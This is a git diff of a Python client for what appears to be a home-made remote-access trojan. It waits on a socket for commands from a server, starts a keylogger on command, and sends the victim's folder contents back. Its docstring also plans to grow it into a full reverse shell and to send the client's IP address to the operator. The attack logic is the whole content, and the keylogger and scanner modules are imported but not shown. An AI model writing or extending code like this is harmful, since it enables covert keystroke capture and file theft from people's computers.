@@ -1,12 +1,14 @@
 import socket
 import userscanner
 import keylogger
-import time
 # TODO finish a client command structure
 """ 
     This will await commands from the server something like a reverse shell
     When the server sends a show file request this will call the userscanner function
     We can extend this to full on reverse shell in the future
+
+    ALSO:
+        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
 """
 while True:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
@@ -19,17 +21,17 @@ while True:
             print("3")
             with conn:
                 while True:
-                    time.sleep(0.1)
-                    data = conn.recv(128).decode("utf-8") 
+                    data = conn.recv(64).decode("utf-8") 
                     # The command section:
                     match data:
                         case "run -keylogger":
-                            keylogger.start_keylogger(True)
+                            keylogger.start_keylogger()
                             print("Client Started the keylogger.")
-                        case "stop -keylogger":
-                            keylogger.start_keylogger(False)
-                            print("Client Started the keylogger.")
-                        case "run -getFileNames":
-                            userscanner.sendFolderData()
-                        
+                            data = " "
+                        # To je kokotské implementovanie, ale nemusím 500 if dávať
+                        case data if "run -getFolderContents" in data:
+                            userscanner.start_FolderData(data)
+                            print("Client Started the FileTransfer.")
+                            data = " "
+
                         
